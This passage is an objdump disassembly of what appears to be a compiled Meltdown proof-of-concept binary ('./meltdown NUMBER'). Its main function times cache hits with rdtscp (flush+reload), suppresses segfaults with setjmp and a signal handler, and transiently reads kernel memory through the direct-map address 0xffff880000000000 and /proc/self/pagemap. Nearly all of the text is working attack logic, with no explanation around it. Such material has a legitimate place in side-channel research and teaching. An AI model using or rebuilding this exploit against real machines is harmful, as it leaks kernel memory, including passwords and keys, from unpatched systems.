    113d:	bf 00 08 00 00       	mov    $0x800,%edi
    1142:	e8 f9 f7 ff ff       	callq  940 <malloc@plt>
    1147:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    114b:	c7 85 48 ff ff ff 00 	movl   $0x0,-0xb8(%rbp)
    1152:	00 00 00 
    1155:	eb 25                	jmp    117c <main+0x278>
    1157:	8b 85 48 ff ff ff    	mov    -0xb8(%rbp),%eax
    115d:	48 98                	cltq   
    115f:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1166:	00 
    1167:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    116b:	48 01 d0             	add    %rdx,%rax
    116e:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    1175:	83 85 48 ff ff ff 01 	addl   $0x1,-0xb8(%rbp)
    117c:	81 bd 48 ff ff ff ff 	cmpl   $0xff,-0xb8(%rbp)
    1183:	00 00 00 
    1186:	7e cf                	jle    1157 <main+0x253>
    1188:	c7 85 4c ff ff ff 64 	movl   $0x64,-0xb4(%rbp)
    118f:	00 00 00 
    1192:	e9 88 01 00 00       	jmpq   131f <main+0x41b>
    1197:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    119b:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    119f:	48 8b 75 98          	mov    -0x68(%rbp),%rsi
    11a3:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    11a7:	48 89 c1             	mov    %rax,%rcx
    11aa:	48 89 f3             	mov    %rsi,%rbx
    11ad:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
    11b4:	0f ae f0             	mfence 
    11b7:	48 0f b6 03          	movzbq (%rbx),%rax
    11bb:	48 c1 e0 0c          	shl    $0xc,%rax
    11bf:	48 01 c1             	add    %rax,%rcx
    11c2:	48 8b 11             	mov    (%rcx),%rdx
    11c5:	48 89 4d 88          	mov    %rcx,-0x78(%rbp)
    11c9:	bf 00 08 00 00       	mov    $0x800,%edi
    11ce:	e8 6d f7 ff ff       	callq  940 <malloc@plt>
    11d3:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    11d7:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    11db:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    11df:	c7 85 50 ff ff ff 00 	movl   $0x0,-0xb0(%rbp)
    11e6:	00 00 00 
    11e9:	eb 52                	jmp    123d <main+0x339>
    11eb:	8b 85 50 ff ff ff    	mov    -0xb0(%rbp),%eax
    11f1:	48 98                	cltq   
    11f3:	48 c1 e0 0c          	shl    $0xc,%rax
    11f7:	48 89 c2             	mov    %rax,%rdx
    11fa:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    11fe:	48 01 d0             	add    %rdx,%rax
    1201:	48 89 c3             	mov    %rax,%rbx
    1204:	0f ae f0             	mfence 
    1207:	0f ae e8             	lfence 
    120a:	0f 01 f9             	rdtscp 
    120d:	49 89 c2             	mov    %rax,%r10
    1210:	48 8b 0b             	mov    (%rbx),%rcx
    1213:	0f 01 f9             	rdtscp 
    1216:	4c 29 d0             	sub    %r10,%rax
    1219:	48 89 c3             	mov    %rax,%rbx
    121c:	8b 85 50 ff ff ff    	mov    -0xb0(%rbp),%eax
    1222:	48 98                	cltq   
    1224:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    122b:	00 
    122c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1230:	48 01 d0             	add    %rdx,%rax
    1233:	48 89 18             	mov    %rbx,(%rax)
    1236:	83 85 50 ff ff ff 01 	addl   $0x1,-0xb0(%rbp)
    123d:	81 bd 50 ff ff ff ff 	cmpl   $0xff,-0xb0(%rbp)
    1244:	00 00 00 
    1247:	7e a2                	jle    11eb <main+0x2e7>
    1249:	c7 85 54 ff ff ff 00 	movl   $0x0,-0xac(%rbp)
    1250:	00 00 00 
    1253:	e9 98 00 00 00       	jmpq   12f0 <main+0x3ec>
    1258:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
    125e:	48 98                	cltq   
    1260:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1267:	00 
    1268:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    126c:	48 01 d0             	add    %rdx,%rax
    126f:	48 8b 00             	mov    (%rax),%rax
    1272:	48 3d c8 00 00 00    	cmp    $0xc8,%rax
    1278:	76 1e                	jbe    1298 <main+0x394>
    127a:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
    1280:	48 98                	cltq   
    1282:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1289:	00 
    128a:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    128e:	48 01 d0             	add    %rdx,%rax
    1291:	48 c7 00 c8 00 00 00 	movq   $0xc8,(%rax)
    1298:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
    129e:	48 98                	cltq   
    12a0:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    12a7:	00 
    12a8:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    12ac:	48 01 d0             	add    %rdx,%rax
    12af:	48 8b 08             	mov    (%rax),%rcx
    12b2:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
    12b8:	48 98                	cltq   
    12ba:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    12c1:	00 
    12c2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    12c6:	48 01 d0             	add    %rdx,%rax
    12c9:	48 8b 10             	mov    (%rax),%rdx
    12cc:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
    12d2:	48 98                	cltq   
    12d4:	48 8d 34 c5 00 00 00 	lea    0x0(,%rax,8),%rsi
    12db:	00 
    12dc:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    12e0:	48 01 f0             	add    %rsi,%rax
    12e3:	48 01 ca             	add    %rcx,%rdx
    12e6:	48 89 10             	mov    %rdx,(%rax)
    12e9:	83 85 54 ff ff ff 01 	addl   $0x1,-0xac(%rbp)
    12f0:	81 bd 54 ff ff ff ff 	cmpl   $0xff,-0xac(%rbp)
    12f7:	00 00 00 
    12fa:	0f 8e 58 ff ff ff    	jle    1258 <main+0x354>
    1300:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1304:	48 89 c7             	mov    %rax,%rdi
    1307:	e8 a4 f5 ff ff       	callq  8b0 <free@plt>
    130c:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    1310:	48 89 c7             	mov    %rax,%rdi
    1313:	e8 50 fa ff ff       	callq  d68 <flushprobe>
    1318:	83 ad 4c ff ff ff 01 	subl   $0x1,-0xb4(%rbp)
    131f:	83 bd 4c ff ff ff 00 	cmpl   $0x0,-0xb4(%rbp)
    1326:	0f 85 6b fe ff ff    	jne    1197 <main+0x293>
    132c:	48 b8 00 e4 0b 54 02 	movabs $0x2540be400,%rax
    1333:	00 00 00 
    1336:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
    133a:	c7 85 58 ff ff ff ff 	movl   $0xffffffff,-0xa8(%rbp)
    1341:	ff ff ff 
    1344:	c7 85 5c ff ff ff 00 	movl   $0x0,-0xa4(%rbp)
    134b:	00 00 00 
    134e:	e9 81 00 00 00       	jmpq   13d4 <main+0x4d0>
    1353:	8b 85 5c ff ff ff    	mov    -0xa4(%rbp),%eax
    1359:	48 98                	cltq   
    135b:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1362:	00 
    1363:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1367:	48 01 d0             	add    %rdx,%rax
    136a:	48 8b 00             	mov    (%rax),%rax
    136d:	48 c1 e8 02          	shr    $0x2,%rax
    1371:	48 ba c3 f5 28 5c 8f 	movabs $0x28f5c28f5c28f5c3,%rdx
    1378:	c2 f5 28 
    137b:	48 f7 e2             	mul    %rdx
    137e:	48 89 d0             	mov    %rdx,%rax
    1381:	48 c1 e8 02          	shr    $0x2,%rax
    1385:	48 39 45 a0          	cmp    %rax,-0x60(%rbp)
    1389:	76 42                	jbe    13cd <main+0x4c9>
    138b:	8b 85 5c ff ff ff    	mov    -0xa4(%rbp),%eax
    1391:	48 98                	cltq   
    1393:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    139a:	00 
    139b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    139f:	48 01 d0             	add    %rdx,%rax
    13a2:	48 8b 00             	mov    (%rax),%rax
    13a5:	48 c1 e8 02          	shr    $0x2,%rax
    13a9:	48 ba c3 f5 28 5c 8f 	movabs $0x28f5c28f5c28f5c3,%rdx
    13b0:	c2 f5 28 
    13b3:	48 f7 e2             	mul    %rdx
    13b6:	48 89 d0             	mov    %rdx,%rax
    13b9:	48 c1 e8 02          	shr    $0x2,%rax
    13bd:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
    13c1:	8b 85 5c ff ff ff    	mov    -0xa4(%rbp),%eax
    13c7:	89 85 58 ff ff ff    	mov    %eax,-0xa8(%rbp)
    13cd:	83 85 5c ff ff ff 01 	addl   $0x1,-0xa4(%rbp)
    13d4:	81 bd 5c ff ff ff ff 	cmpl   $0xff,-0xa4(%rbp)
    13db:	00 00 00 
    13de:	0f 8e 6f ff ff ff    	jle    1353 <main+0x44f>
    13e4:	48 8b 75 a0          	mov    -0x60(%rbp),%rsi
    13e8:	8b 8d 58 ff ff ff    	mov    -0xa8(%rbp),%ecx
    13ee:	8b 95 58 ff ff ff    	mov    -0xa8(%rbp),%edx
    13f4:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    13f8:	49 89 f0             	mov    %rsi,%r8
    13fb:	48 89 c6             	mov    %rax,%rsi
    13fe:	48 8d 3d 53 06 00 00 	lea    0x653(%rip),%rdi        # 1a58 <_IO_stdin_used+0x1d8>
    1405:	b8 00 00 00 00       	mov    $0x0,%eax
    140a:	e8 d1 f4 ff ff       	callq  8e0 <printf@plt>
    140f:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1413:	48 89 c7             	mov    %rax,%rdi
    1416:	e8 95 f4 ff ff       	callq  8b0 <free@plt>
    141b:	48 83 45 98 01       	addq   $0x1,-0x68(%rbp)
    1420:	83 85 44 ff ff ff 01 	addl   $0x1,-0xbc(%rbp)
    1427:	83 bd 44 ff ff ff 0f 	cmpl   $0xf,-0xbc(%rbp)
    142e:	0f 8e 09 fd ff ff    	jle    113d <main+0x239>
    1434:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    1438:	48 89 c7             	mov    %rax,%rdi
    143b:	e8 70 f4 ff ff       	callq  8b0 <free@plt>
    1440:	e9 85 03 00 00       	jmpq   17ca <main+0x8c6>
    1445:	83 bd 7c ff ff ff 03 	cmpl   $0x3,-0x84(%rbp)
    144c:	0f 85 78 03 00 00    	jne    17ca <main+0x8c6>
    1452:	48 8d 35 df f8 ff ff 	lea    -0x721(%rip),%rsi        # d38 <trycatch_segfault_handler>
    1459:	bf 0b 00 00 00       	mov    $0xb,%edi
    145e:	e8 ad f4 ff ff       	callq  910 <signal@plt>
    1463:	bf 12 00 00 00       	mov    $0x12,%edi
    1468:	e8 d3 f4 ff ff       	callq  940 <malloc@plt>
    146d:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    1471:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1475:	48 b9 3f 21 3f 20 4d 	movabs $0x544c454d203f213f,%rcx
    147c:	45 4c 54 
    147f:	48 bb 44 4f 57 4e 20 	movabs $0x3f213f204e574f44,%rbx
    1486:	3f 21 3f 
    1489:	48 89 08             	mov    %rcx,(%rax)
    148c:	48 89 58 08          	mov    %rbx,0x8(%rax)
    1490:	c6 40 10 00          	movb   $0x0,0x10(%rax)
    1494:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1498:	48 89 c7             	mov    %rax,%rdi
    149b:	e8 20 f7 ff ff       	callq  bc0 <get_phys_addr>
    14a0:	48 89 c2             	mov    %rax,%rdx
    14a3:	48 b8 00 00 00 00 00 	movabs $0xffff880000000000,%rax
    14aa:	88 ff ff 
    14ad:	48 01 d0             	add    %rdx,%rax
    14b0:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
    14b4:	c7 85 60 ff ff ff 96 	movl   $0x96,-0xa0(%rbp)
    14bb:	00 00 00 
    14be:	e9 fa 02 00 00       	jmpq   17bd <main+0x8b9>
    14c3:	bf 00 08 00 00       	mov    $0x800,%edi
    14c8:	e8 73 f4 ff ff       	callq  940 <malloc@plt>
    14cd:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    14d1:	c7 85 64 ff ff ff 00 	movl   $0x0,-0x9c(%rbp)
    14d8:	00 00 00 
    14db:	eb 25                	jmp    1502 <main+0x5fe>
    14dd:	8b 85 64 ff ff ff    	mov    -0x9c(%rbp),%eax
    14e3:	48 98                	cltq   
    14e5:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    14ec:	00 
    14ed:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    14f1:	48 01 d0             	add    %rdx,%rax
    14f4:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    14fb:	83 85 64 ff ff ff 01 	addl   $0x1,-0x9c(%rbp)
    1502:	81 bd 64 ff ff ff ff 	cmpl   $0xff,-0x9c(%rbp)
    1509:	00 00 00 
    150c:	7e cf                	jle    14dd <main+0x5d9>
    150e:	c7 85 68 ff ff ff 64 	movl   $0x64,-0x98(%rbp)
    1515:	00 00 00 
    1518:	e9 98 01 00 00       	jmpq   16b5 <main+0x7b1>
    151d:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    1521:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    1525:	48 8d 3d 14 0b 20 00 	lea    0x200b14(%rip),%rdi        # 202040 <trycatch_buf>
    152c:	e8 cf f3 ff ff       	callq  900 <_setjmp@plt>
    1531:	85 c0                	test   %eax,%eax
    1533:	75 2a                	jne    155f <main+0x65b>
    1535:	48 8b 75 a8          	mov    -0x58(%rbp),%rsi
    1539:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    153d:	48 89 c1             	mov    %rax,%rcx
    1540:	48 89 f3             	mov    %rsi,%rbx
    1543:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
    154a:	0f ae f0             	mfence 
    154d:	48 0f b6 03          	movzbq (%rbx),%rax
    1551:	48 c1 e0 0c          	shl    $0xc,%rax
    1555:	48 01 c1             	add    %rax,%rcx
    1558:	48 8b 11             	mov    (%rcx),%rdx
    155b:	48 89 4d 88          	mov    %rcx,-0x78(%rbp)
    155f:	bf 00 08 00 00       	mov    $0x800,%edi
    1564:	e8 d7 f3 ff ff       	callq  940 <malloc@plt>
    1569:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    156d:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    1571:	48 89 45 88          	mov    %rax,-0x78(%rbp)
    1575:	c7 85 6c ff ff ff 00 	movl   $0x0,-0x94(%rbp)
    157c:	00 00 00 
    157f:	eb 52                	jmp    15d3 <main+0x6cf>
    1581:	8b 85 6c ff ff ff    	mov    -0x94(%rbp),%eax
    1587:	48 98                	cltq   
    1589:	48 c1 e0 0c          	shl    $0xc,%rax
    158d:	48 89 c2             	mov    %rax,%rdx
    1590:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    1594:	48 01 d0             	add    %rdx,%rax
    1597:	48 89 c3             	mov    %rax,%rbx
    159a:	0f ae f0             	mfence 
    159d:	0f ae e8             	lfence 
    15a0:	0f 01 f9             	rdtscp 
    15a3:	49 89 c2             	mov    %rax,%r10
    15a6:	48 8b 0b             	mov    (%rbx),%rcx
    15a9:	0f 01 f9             	rdtscp 
    15ac:	4c 29 d0             	sub    %r10,%rax
    15af:	48 89 c3             	mov    %rax,%rbx
    15b2:	8b 85 6c ff ff ff    	mov    -0x94(%rbp),%eax
    15b8:	48 98                	cltq   
    15ba:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    15c1:	00 
    15c2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    15c6:	48 01 d0             	add    %rdx,%rax
    15c9:	48 89 18             	mov    %rbx,(%rax)
    15cc:	83 85 6c ff ff ff 01 	addl   $0x1,-0x94(%rbp)
    15d3:	81 bd 6c ff ff ff ff 	cmpl   $0xff,-0x94(%rbp)
    15da:	00 00 00 
    15dd:	7e a2                	jle    1581 <main+0x67d>
    15df:	c7 85 70 ff ff ff 00 	movl   $0x0,-0x90(%rbp)
    15e6:	00 00 00 
    15e9:	e9 98 00 00 00       	jmpq   1686 <main+0x782>
    15ee:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
    15f4:	48 98                	cltq   
    15f6:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    15fd:	00 
    15fe:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1602:	48 01 d0             	add    %rdx,%rax
    1605:	48 8b 00             	mov    (%rax),%rax
    1608:	48 3d c8 00 00 00    	cmp    $0xc8,%rax
    160e:	76 1e                	jbe    162e <main+0x72a>
    1610:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
    1616:	48 98                	cltq   
    1618:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    161f:	00 
    1620:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1624:	48 01 d0             	add    %rdx,%rax
    1627:	48 c7 00 c8 00 00 00 	movq   $0xc8,(%rax)
    162e:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
    1634:	48 98                	cltq   
    1636:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    163d:	00 
    163e:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    1642:	48 01 d0             	add    %rdx,%rax
    1645:	48 8b 08             	mov    (%rax),%rcx
    1648:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
    164e:	48 98                	cltq   
    1650:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1657:	00 
    1658:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    165c:	48 01 d0             	add    %rdx,%rax
    165f:	48 8b 10             	mov    (%rax),%rdx
    1662:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
    1668:	48 98                	cltq   
    166a:	48 8d 34 c5 00 00 00 	lea    0x0(,%rax,8),%rsi
    1671:	00 
    1672:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    1676:	48 01 f0             	add    %rsi,%rax
    1679:	48 01 ca             	add    %rcx,%rdx
    167c:	48 89 10             	mov    %rdx,(%rax)
    167f:	83 85 70 ff ff ff 01 	addl   $0x1,-0x90(%rbp)
    1686:	81 bd 70 ff ff ff ff 	cmpl   $0xff,-0x90(%rbp)
    168d:	00 00 00 
    1690:	0f 8e 58 ff ff ff    	jle    15ee <main+0x6ea>
    1696:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    169a:	48 89 c7             	mov    %rax,%rdi
    169d:	e8 0e f2 ff ff       	callq  8b0 <free@plt>
    16a2:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    16a6:	48 89 c7             	mov    %rax,%rdi
    16a9:	e8 ba f6 ff ff       	callq  d68 <flushprobe>
    16ae:	83 ad 68 ff ff ff 01 	subl   $0x1,-0x98(%rbp)
    16b5:	83 bd 68 ff ff ff 00 	cmpl   $0x0,-0x98(%rbp)
    16bc:	0f 85 5b fe ff ff    	jne    151d <main+0x619>
    16c2:	48 b8 00 e4 0b 54 02 	movabs $0x2540be400,%rax
    16c9:	00 00 00 
    16cc:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    16d0:	c7 85 74 ff ff ff ff 	movl   $0xffffffff,-0x8c(%rbp)
    16d7:	ff ff ff 
    16da:	c7 85 78 ff ff ff 00 	movl   $0x0,-0x88(%rbp)
    16e1:	00 00 00 
    16e4:	e9 81 00 00 00       	jmpq   176a <main+0x866>
    16e9:	8b 85 78 ff ff ff    	mov    -0x88(%rbp),%eax
    16ef:	48 98                	cltq   
    16f1:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    16f8:	00 
    16f9:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    16fd:	48 01 d0             	add    %rdx,%rax
    1700:	48 8b 00             	mov    (%rax),%rax
    1703:	48 c1 e8 02          	shr    $0x2,%rax
    1707:	48 ba c3 f5 28 5c 8f 	movabs $0x28f5c28f5c28f5c3,%rdx
    170e:	c2 f5 28 
    1711:	48 f7 e2             	mul    %rdx
    1714:	48 89 d0             	mov    %rdx,%rax
    1717:	48 c1 e8 02          	shr    $0x2,%rax
    171b:	48 39 45 b8          	cmp    %rax,-0x48(%rbp)
    171f:	76 42                	jbe    1763 <main+0x85f>
    1721:	8b 85 78 ff ff ff    	mov    -0x88(%rbp),%eax
    1727:	48 98                	cltq   
    1729:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1730:	00 
    1731:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    1735:	48 01 d0             	add    %rdx,%rax
    1738:	48 8b 00             	mov    (%rax),%rax
    173b:	48 c1 e8 02          	shr    $0x2,%rax
    173f:	48 ba c3 f5 28 5c 8f 	movabs $0x28f5c28f5c28f5c3,%rdx
    1746:	c2 f5 28 
    1749:	48 f7 e2             	mul    %rdx
    174c:	48 89 d0             	mov    %rdx,%rax
    174f:	48 c1 e8 02          	shr    $0x2,%rax
    1753:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    1757:	8b 85 78 ff ff ff    	mov    -0x88(%rbp),%eax
    175d:	89 85 74 ff ff ff    	mov    %eax,-0x8c(%rbp)
    1763:	83 85 78 ff ff ff 01 	addl   $0x1,-0x88(%rbp)
    176a:	81 bd 78 ff ff ff ff 	cmpl   $0xff,-0x88(%rbp)
    1771:	00 00 00 
    1774:	0f 8e 6f ff ff ff    	jle    16e9 <main+0x7e5>
    177a:	48 8b 75 b8          	mov    -0x48(%rbp),%rsi
    177e:	8b 8d 74 ff ff ff    	mov    -0x8c(%rbp),%ecx
    1784:	8b 95 74 ff ff ff    	mov    -0x8c(%rbp),%edx
    178a:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
    178e:	49 89 f0             	mov    %rsi,%r8
    1791:	48 89 c6             	mov    %rax,%rsi
    1794:	48 8d 3d bd 02 00 00 	lea    0x2bd(%rip),%rdi        # 1a58 <_IO_stdin_used+0x1d8>
    179b:	b8 00 00 00 00       	mov    $0x0,%eax
    17a0:	e8 3b f1 ff ff       	callq  8e0 <printf@plt>
    17a5:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    17a9:	48 89 c7             	mov    %rax,%rdi
    17ac:	e8 ff f0 ff ff       	callq  8b0 <free@plt>
    17b1:	48 83 45 a8 01       	addq   $0x1,-0x58(%rbp)
    17b6:	83 ad 60 ff ff ff 01 	subl   $0x1,-0xa0(%rbp)
    17bd:	83 bd 60 ff ff ff 00 	cmpl   $0x0,-0xa0(%rbp)
    17c4:	0f 85 f9 fc ff ff    	jne    14c3 <main+0x5bf>
    17ca:	48 8d 3d a7 02 00 00 	lea    0x2a7(%rip),%rdi        # 1a78 <_IO_stdin_used+0x1f8>
    17d1:	e8 ea f0 ff ff       	callq  8c0 <puts@plt>
    17d6:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    17da:	48 89 c7             	mov    %rax,%rdi
    17dd:	e8 ce f0 ff ff       	callq  8b0 <free@plt>
    17e2:	b8 00 00 00 00       	mov    $0x0,%eax
    17e7:	48 81 c4 d8 00 00 00 	add    $0xd8,%rsp
    17ee:	5b                   	pop    %rbx
    17ef:	5d                   	pop    %rbp
    17f0:	c3                   	retq   
    17f1:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    17f8:	00 00 00 
    17fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000001800 <__libc_csu_init>:
    1800:	41 57                	push   %r15
    1802:	41 56                	push   %r14
    1804:	49 89 d7             	mov    %rdx,%r15
    1807:	41 55                	push   %r13
    1809:	41 54                	push   %r12
    180b:	4c 8d 25 2e 05 20 00 	lea    0x20052e(%rip),%r12        # 201d40 <__frame_dummy_init_array_entry>
    1812:	55                   	push   %rbp
    1813:	48 8d 2d 2e 05 20 00 	lea    0x20052e(%rip),%rbp        # 201d48 <__init_array_end>
    181a:	53                   	push   %rbx
    181b:	41 89 fd             	mov    %edi,%r13d
    181e:	49 89 f6             	mov    %rsi,%r14
    1821:	4c 29 e5             	sub    %r12,%rbp
    1824:	48 83 ec 08          	sub    $0x8,%rsp
    1828:	48 c1 fd 03          	sar    $0x3,%rbp
    182c:	e8 47 f0 ff ff       	callq  878 <_init>
    1831:	48 85 ed             	test   %rbp,%rbp
    1834:	74 20                	je     1856 <__libc_csu_init+0x56>
    1836:	31 db                	xor    %ebx,%ebx
    1838:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    183f:	00 
    1840:	4c 89 fa             	mov    %r15,%rdx
    1843:	4c 89 f6             	mov    %r14,%rsi
    1846:	44 89 ef             	mov    %r13d,%edi
    1849:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
    184d:	48 83 c3 01          	add    $0x1,%rbx
    1851:	48 39 dd             	cmp    %rbx,%rbp
    1854:	75 ea                	jne    1840 <__libc_csu_init+0x40>
    1856:	48 83 c4 08          	add    $0x8,%rsp
    185a:	5b                   	pop    %rbx
    185b:	5d                   	pop    %rbp
    185c:	41 5c                	pop    %r12
    185e:	41 5d                	pop    %r13
    1860:	41 5e                	pop    %r14
    1862:	41 5f                	pop    %r15
    1864:	c3                   	retq   
    1865:	90                   	nop
    1866:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    186d:	00 00 00 

0000000000001870 <__libc_csu_fini>:
    1870:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000001874 <_fini>:
    1874:	48 83 ec 08          	sub    $0x8,%rsp
    1878:	48 83 c4 08          	add    $0x8,%rsp
    187c:	c3                   	retq   

Disassembly of section .rodata:

0000000000001880 <_IO_stdin_used>:
    1880:	01 00                	add    %eax,(%rax)
    1882:	02 00                	add    (%rax),%al
    1884:	00 00                	add    %al,(%rax)
    1886:	00 00                	add    %al,(%rax)
    1888:	2f                   	(bad)  
    1889:	70 72                	jo     18fd <_IO_stdin_used+0x7d>
    188b:	6f                   	outsl  %ds:(%rsi),(%dx)
    188c:	63 2f                	movslq (%rdi),%ebp
    188e:	73 65                	jae    18f5 <_IO_stdin_used+0x75>
    1890:	6c                   	insb   (%dx),%es:(%rdi)
    1891:	66 2f                	data16 (bad) 
    1893:	70 61                	jo     18f6 <_IO_stdin_used+0x76>
    1895:	67 65 6d             	gs insl (%dx),%es:(%edi)
    1898:	61                   	(bad)  
    1899:	70 00                	jo     189b <_IO_stdin_used+0x1b>
    189b:	66 75 6e             	data16 jne 190c <_IO_stdin_used+0x8c>
    189e:	63 74 69 6f          	movslq 0x6f(%rcx,%rbp,2),%esi
    18a2:	6e                   	outsb  %ds:(%rsi),(%dx)
    18a3:	73 2e                	jae    18d3 <_IO_stdin_used+0x53>
    18a5:	68 00 66 64 20       	pushq  $0x20646600
    18aa:	3e 3d 20 30 00 28    	ds cmp $0x28003020,%eax
    18b0:	76 61                	jbe    1913 <_IO_stdin_used+0x93>
    18b2:	6c                   	insb   (%dx),%es:(%rdi)
    18b3:	75 65                	jne    191a <_IO_stdin_used+0x9a>
    18b5:	20 3c 3c             	and    %bh,(%rsp,%rdi,1)
    18b8:	20 31                	and    %dh,(%rcx)
    18ba:	32 29                	xor    (%rcx),%ch
    18bc:	20 3e                	and    %bh,(%rsi)
    18be:	20 30                	and    %dh,(%rax)
    18c0:	00 64 69 66          	add    %ah,0x66(%rcx,%rbp,2)
    18c4:	61                   	(bad)  
    18c5:	72 72                	jb     1939 <_IO_stdin_used+0xb9>
    18c7:	5b                   	pop    %rbx
    18c8:	25 64 5d 3a 20       	and    $0x203a5d64,%eax
    18cd:	25 6c 64 0a 00       	and    $0xa646c,%eax
    18d2:	55                   	push   %rbp
    18d3:	73 61                	jae    1936 <_IO_stdin_used+0xb6>
    18d5:	67 65 3a 09          	cmp    %gs:(%ecx),%cl
    18d9:	20 2e                	and    %ch,(%rsi)
    18db:	2f                   	(bad)  
    18dc:	6d                   	insl   (%dx),%es:(%rdi)
    18dd:	65 6c                	gs insb (%dx),%es:(%rdi)
    18df:	74 64                	je     1945 <_IO_stdin_used+0xc5>
    18e1:	6f                   	outsl  %ds:(%rsi),(%dx)
    18e2:	77 6e                	ja     1952 <_IO_stdin_used+0xd2>
    18e4:	20 4e 55             	and    %cl,0x55(%rsi)
    18e7:	4d                   	rex.WRB
    18e8:	42                   	rex.X
    18e9:	45 52                	rex.RB push %r10
    18eb:	00 00                	add    %al,(%rax)
    18ed:	00 00                	add    %al,(%rax)
    18ef:	00 4e 75             	add    %cl,0x75(%rsi)
    18f2:	6d                   	insl   (%dx),%es:(%rdi)
    18f3:	62                   	(bad)  
    18f4:	65 72 20             	gs jb  1917 <_IO_stdin_used+0x97>
    18f7:	30 3a                	xor    %bh,(%rdx)
    18f9:	20 54 65 73          	and    %dl,0x73(%rbp,%riz,2)
    18fd:	74 69                	je     1968 <_IO_stdin_used+0xe8>
    18ff:	6e                   	outsb  %ds:(%rsi),(%dx)
    1900:	67 20 66 6c          	and    %ah,0x6c(%esi)
    1904:	75 73                	jne    1979 <_IO_stdin_used+0xf9>
    1906:	68 20 61 6e 64       	pushq  $0x646e6120
    190b:	20 72 65             	and    %dh,0x65(%rdx)
    190e:	6c                   	insb   (%dx),%es:(%rdi)
